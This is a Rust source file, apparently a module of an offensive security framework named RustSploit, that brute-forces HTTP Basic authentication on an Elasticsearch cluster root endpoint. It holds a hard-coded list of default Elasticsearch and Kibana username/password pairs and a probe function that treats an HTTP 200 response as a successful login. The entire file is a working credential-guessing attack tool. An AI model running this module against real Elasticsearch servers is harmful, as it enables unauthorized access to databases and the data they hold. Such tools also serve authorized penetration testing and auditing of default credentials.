//! Elasticsearch credential brute-force via HTTP Basic on the cluster root.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 9200;

const DEFAULTS: &[(&str, &str)] = &[
    ("elastic", "changeme"),
    ("elastic", "elastic"),
    ("elastic", "password"),
    ("kibana", "kibana"),
    ("admin", "admin"),
    ("admin", "password"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Elasticsearch Bruteforce".to_string(),
        description:
            "Tests Elasticsearch HTTP Basic auth on the cluster root endpoint. \
             Single-target — scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: ModuleRank::Normal,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("elasticsearch_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "elasticsearch",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/elasticsearch_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass| async move { probe(&host, port, &user, &pass).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str) -> LoginResult {
    let client = match crate::utils::build_http_client(Duration::from_secs(5)) {
        Ok(c) => c,
        Err(e) => {
            return LoginResult::Error {
                message: format!("http client: {e}"),
                retryable: false,
            }
        }
    };
    let url = format!("http://{}:{}/", host, port);
    let resp = client
        .get(&url)
        .basic_auth(user, Some(pass))
        .send()
        .await;
    match resp {
        Ok(r) => match r.status().as_u16() {
            200 => LoginResult::Success,
            401 | 403 => LoginResult::AuthFailed,
            other => LoginResult::Error {
                message: format!("unexpected status {other}"),
                retryable: false,
            },
        },
        Err(e) => LoginResult::Error {
            message: format!("get: {e}"),
            retryable: e.is_timeout() || e.is_connect(),
        },
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/elasticsearch_bruteforce", native);
